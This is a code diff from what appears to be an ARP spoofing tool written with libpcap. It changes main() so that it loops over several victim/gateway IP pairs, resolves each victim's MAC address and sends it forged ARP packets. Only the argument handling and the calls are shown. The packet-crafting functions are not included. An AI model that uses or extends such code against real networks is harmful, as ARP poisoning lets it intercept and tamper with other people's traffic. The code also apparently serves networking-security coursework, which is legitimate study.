@@ -170,22 +170,28 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	char* dev = argv[1];	
-	char* sender_ip = argv[2]; //victim ip
-	char* target_ip = argv[3]; //gateway ip 	
 	
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr){
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
-	char* myIp = getIpAddress(dev);
-	Mac myMacAddress = getMacAddress(dev);
+	for (int i=2; i<argc; i+=2){
+		char* sender_ip = argv[i];
+		char* target_ip = argv[i+1];
+	      
+	      char errbuf[PCAP_ERRBUF_SIZE];
+	      pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+	      if (handle == nullptr){
+		 fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		 return -1;
+	      }
+	      char* myIp = getIpAddress(dev);
+	      Mac myMacAddress = getMacAddress(dev);
 
-	int request_result = sendRequest(myIp, myMacAddress, sender_ip, handle);
+	      int request_result = sendRequest(myIp, myMacAddress, sender_ip, handle);
+	      
+	      Mac sender_mac = getSenderMac(dev, sender_ip,myMacAddress);
+	      sendArpRequest(dev,myMacAddress,sender_mac,target_ip,sender_ip);   
 	
-	Mac sender_mac = getSenderMac(dev, sender_ip,myMacAddress);
-	sendArpRequest(dev,myMacAddress,sender_mac,target_ip,sender_ip);
+	}
+	
+
 }
 
 
